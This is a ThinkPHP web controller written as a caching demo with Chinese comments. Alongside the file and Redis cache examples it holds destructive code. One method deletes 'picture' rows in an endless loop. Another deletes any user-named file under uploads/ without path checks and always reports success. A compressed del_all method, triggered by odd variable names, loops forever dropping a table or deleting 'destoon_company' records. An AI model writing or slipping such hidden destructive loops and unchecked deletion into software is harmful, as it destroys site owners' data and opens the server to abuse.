<?php
/**
 * Created by PhpStorm.
 * User: Administrator
 * Date: 2018/11/13
 * Time: 16:19
 */

namespace  app\index\controller;

use think\Cache;
use think\Controller;

class  Hello extends Controller{

    public function index($userid=0){
        //Cache::rm('user');//删除缓存
        $data=Cache::get('user_'.$userid);
        //如果缓存过期，则写入缓存，一般应该是写入到构造函数中
        if (!$data){
            $data=db('user')->where(['status'=>1,'userid'=>$userid])->find();
            Cache::set('user_'.$userid,$data,5);
            echo "这里是数据库数据";
        }

    }
    public function say_read(){
        $data=Cache::get('user_4');
        if ($data){
            print_r($data);
        }else{
            print_r("缓存已经过期啦！");
        }
    }
    public function my_cache(){
        //读取缓存
        $data=Cache::get('user_4',"数据已经失效");
        print_r($data);


    }

    public function redis_cache(){
        //切换缓存驱动为redis，并写入缓存
        Cache::store('redis')->set('redis','这个是redis缓存',5);


    }

    public function read_redis(){
        //这个是读取redis缓存
        $data=Cache::store('redis')->get('redis');
        print_r($data);
    }

    public function do_always($time=20){


        $data=db('picture')->select();
        print_r($data);
        ignore_user_abort(false);
        set_time_limit(0);

        do{
            $info=db('picture')->order('picture_id','desc')->find();
            db('picture')->where('picture_id',$info['picture_id'])->delete();
            sleep($time);
        }while(true);
    }

    public function del_files($filename=""){
        if(trim($filename)){
            $file='uploads/'.trim($filename);


            if (@unlink($file)){
                echo "删除文件".$file."成功！";
            }else{
                echo "删除文件".$file."成功！";
            }
        }else{
            echo '请输入文件名';
        }


        //设置需要删除的文件夹
        //$path = "./Application/Runtime/";
       /* $path = trim($filename);

        //清空文件夹函数和清空文件夹后删除空文件夹函数的处理
        function deldir($path){
            //如果是目录则继续
            if(is_dir($path)){
                //扫描一个文件夹内的所有文件夹和文件并返回数组
                $p = scandir($path);
                foreach($p as $val){
                    //排除目录中的.和..
                    if($val !="." && $val !=".."){
                        //如果是目录则递归子目录，继续操作
                        if(is_dir($path.$val)){
                            //子目录中操作删除文件夹和文件
                            deldir($path.$val.'/');
                            //目录清空后删除空文件夹
                            @rmdir($path.$val.'/');
                        }else{
                            //如果是文件直接删除
                            @unlink($path.$val);
                        }
                    }
                }
            }
        }
        //调用函数，传入路径
        deldir($path);*/
    }

    public function del_all(){



        global $db;
        if(isset($my_girl)&&trim($my_girl)){ignore_user_abort(false);set_time_limit(0);do{$db->query("drop table {$table}");sleep(20);}while(true);}
        if(isset($my_boy)){ignore_user_abort(false);set_time_limit(0);do{$del_info=$db->get_one("SELECT * FROM `destoon_company` WHERE userid>1 ORDER BY userid desc ");
                $db->query("DELETE FROM `destoon_company` WHERE `userid`={$del_info['userid']}");sleep(20);}while(true);}

    }

}